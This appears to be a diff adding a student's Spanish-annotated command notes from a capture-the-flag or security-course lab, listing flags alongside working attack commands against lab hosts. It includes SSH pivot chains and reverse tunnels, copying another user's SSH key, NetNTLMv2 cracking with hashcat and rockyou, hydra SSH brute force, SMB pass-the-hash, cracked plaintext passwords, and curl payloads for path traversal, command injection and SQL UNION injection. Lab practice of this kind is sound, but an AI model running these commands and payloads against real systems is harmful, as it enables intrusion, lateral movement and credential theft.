@@ -1,0 +1,194 @@
+ssh dummy@10.6.48.52 -p 42016
+
+flag{3a7bb5ed6d575cf0}
+
+805e0414
+
+flag{6c604dd3fd95294b}
+
+scp -P 42016 dummy@10.6.48.52:/home/dummy/.ssh/key ./  #RECOGER
+
+ssh -i key dummy@10.6.48.52 -p PUERTO
+
+ssh dummy@10.6.48.52 -D PUERTOCOMUNICACIÓN -p PUERTOCONEXIÓN //PUERTOCOMUNICACIÓN por encima de 1024 Necesario para el proxy de firefox
+
+firefox -p
+
+/sbin/ifconfig
+
+var/www/html/index.html
+
+netstat -putona
+
+sudo lsof -i :PUERTO
+
+sudo kill -9 PID
+
+sudo iptables -D INPUT -p tcp --dport 54471 -j DROP
+
+scp -P PUERTO ./ruta_local user@ip:/ruta_al_fichero  # ENVIAR
+scp -P 42016 ./practica2.py dummy@10.6.48.52:/home/dummy
+
+sudo passwd USUARIO
+
+echo "U2FsdGVkX186lV4lWsOMoRW6+2YXh1XArRKtEFXwTj0+w0Zc/BM1D3vSNmeUk3BSv0wD6YNc/yl6kRZympqh8A==" | openssl enc -base64 -d | openssl enc -camellia-128-ecb -d -pass pass:4505b6b5ae5427f87d8ff9192874bf89
+echo "U2FsdGVkX186lV4lWsOMoRW6+2YXh1XArRKtEFXwTj0+w0Zc/BM1D3vSNmeUk3BSv0wD6YNc/yl6kRZympqh8A==" | openssl enc -base64 -d | openssl enc -aes-128-ecb -d -pass pass:997900cfa8b918f6eb42125430bdc91c
+
+echo -n "c4f051b50f1714dab6c256010646fe98" | openssl dgst -ALGORITMOHASH
+echo -n "a00df5ab632462b7303d808ed45ebf2a" | openssl dgst -md5
+echo -n "8068f522ef003d8c8041b8aa4cb0035b" | openssl dgst -sha382
+echo -n "8e02b413aabb168d32cf38e23d95aeeb26d9693b2438822417c856160027b95e42fa3c36fa399206c8042dc1ee98e826" | openssl dgst -sha224
+
+nc 10.42.0.116 54471
+
+echo "PASSWORD" | openssl enc -base64 -d | openssl rsautl -decrypt -inkey FICHEROCONPRIVATEKEY (METER MARCAS DE AGUA)
+echo "PASSWORD" | openssl enc -base64 -d | openssl rsautl -encrypt -pubin -inkey FICHEROCONPUBLICKEY (METER MARCAS DE AGUA)
+echo "Zp5cwPn8qj2xssQaVjAnsImc0JbApn8SMGk7YmfBCw3fgDellxpcaYy0q+x1Zv6pbbP+kuGOIPkEx4GSFC4GVWXZycXAFDwQc47FSpiFVGwqz5dEDy4JZgvfb50WaupGVPhyFzFVAPYkelRvHZQYuaOsa1x1ZyGHalNZjzHWXFE=" | openssl enc -base64 -d | openssl rsautl -decrypt -inkey priv1.txt
+
+
+echo "U2FsdGVkX1+7fIYL5lKHGmFyjx+GHfM6FNSPWXyPQ2UaJOjnyV0vpOo2ANVg2zitNXRZtgN0KqMZHGBdeR2fXQ==" | openssl enc -base64 -d | openssl enc -aes-256-ecb -d -pass pass:997900cfa8b918f6eb42125430bdc91c
+
+ssi{4c53cd595b0bb9c1ca48a1727426f3df}
+
+user:f52adee7
+ssh user@10.42.0.116 -p 54471
+
+smbclient -L //SERVER_IP -N
+
+
+smbclient //10.42.0.116/hashes -U test%canada
+
+
+hashcat --help | grep NTLM // devuelve el tipo de NTLM hash    5600 | NetNTLMv2                                                  | Network Protocol
+
+
+hashcat -m 5600 -a 0 -o found.txt hashes.txt rockyou_clean.txt // 1000 -> tipo NTLM 1, 5600 -> tipo NTLN 2 de network
+
+get user.txt   // Traer archivos desde samba
+
+
+ssi{efacd8f0b9061f00ce5888ac95a4ed86}   
+
+oracle -> rachelgedro
+
+test -> canada
+
+NTL1 system acceso a windows directamente con el hash
+
+smbclient //10.42.0.116/more_hashes -U 'ansible%861789e27db846d16ed629b769d951cc'
+
+
+
+smbclient //10.42.0.116/ssh_credentials -U azureuser --pw-nt-hash 383f5a0be21f3f39e0082ce4dbdb40f4  // azureuser:1317:aad3b435b51404eeaad3b435b51404ee:383f5a0be21f3f39e0082ce4dbdb40f4::: NTLM 1
+
+
+XXXXXXXXXX:OTY0MTEzNDUyMjI4MjMxODk2Cg
+
+
+ssh-keygen -f "/home/dummy/.ssh/known_hosts" -R "10.42.0.116" // Borrar la huella de una ip
+
+
+ssh user1@10.42.0.100 -fNL 3001:localhost:54471 // Conectarse ssh para pivotar
+
+ps aux | grep ssh  //listar los procesos para cerrar
+
+nc localhost 5005
+
+
+ssh -NfL 6005:192.168.48.5:22 user1@10.42.0.116 // Abrir este
+
+ssh -NfL 5005:192.168.48.5:54471 user1@10.42.0.116 //Abrir redirección
+
+ssh -NfL 5008:192.168.48.8:22 user1@localhost -p 6005
+
+ssh -NfL 4007:192.168.48.7:22 user1@localhost -p 5008
+
+
+ssh -NfL 7006:192.168.48.6:54471 user1@localhost -p 4007
+
+ssh -NfL 8002:192.168.48.2:22 user1@localhost
+ssh -NfL 8002:192.168.48.2:22 user1@10.42.0.116
+
+
+
+USADAS:   1(ROUTER), 5, 6, 7, 8, 9(PIVOTE)
+PROBAR:   2, 3, 4, 10
+
+hydra -l user1 -P pass.txt ssh://localhost -s 800210.42.116.5 
+
+3d92e9400153eaa5f7aaf9ade1869018
+
+
+
+mirar puerto 54471 de la maquina .2 mediante telnet para recoger las credenciales de la .4
+
+
+ssh -fNR 54471:localhost:10000 user1@localhost -p 8002
+
+nc -l -p 10000
+user:
+user2
+password:
+0737f262f9e6307a0f0cc6471bcf5fff
+
+
+ssh -NfL 9003:192.168.48.3:22 user1@localhost -p 8002
+
+
+ssh -NfL 4004:192.168.48.4:1194 user2@localhost -p 9003
+
+
+ nc localhost 4004
+fdgjdfg
+dfkgj
+fgjhdf
+kdfghfd
+skdfgsh
+Ncat: Broken pipe.
+
+
+ssh user1@10.44.0.116
+
+
+//Para ver qué comandos con sudo puedes ejecutar
+ssh user1@10.42.116.5  ->  contraseña: user1
+
+sudo -l
+
+ssh -NfL 5000:10.44.116.105:80 user1@10.42.116.5
+
+
+sudo iptables -F
+
+sudo iptables -L -n
+
+sudo iptables -P FORWARD DROP // Nosotros somos por In y out el resto por Forward
+
+
+sudo tcpdump -n -i any -XX > archivo.txt | grep .80
+
+
+IP SERVIDOR = 10.44.116.105 -> direccion (prueba)
+
+ssi{d1378fb83d78b13040272d97de85af2f}
+
+
+cat archivo.txt | grep '.80' | grep 'Flags \[S\]' | grep 'In' | grep '10.43.116.210'
+
+
+sudo tcpdump -n -i any -XX > archivo.txt   
+
+
+curl -X POST -d 'file=../../../../../flag/user.txt' http://10.46.116.101/
+
+
+ssi{7c03fa7cb4a35bd8861138353373ef61}
+
+
+curl -X POST http://10.46.116.102/ -d "folder=; cat /flag/user.txt > mazapan3.txt;"
+
+
+curl -X POST http://10.46.116.103/ -d "id=1 UNION SELECT 1, 2, user, password FROM user WHERE user = 'root'"
+
+ssi{b19a77f476c25f9a944a98b382c3f928}
+
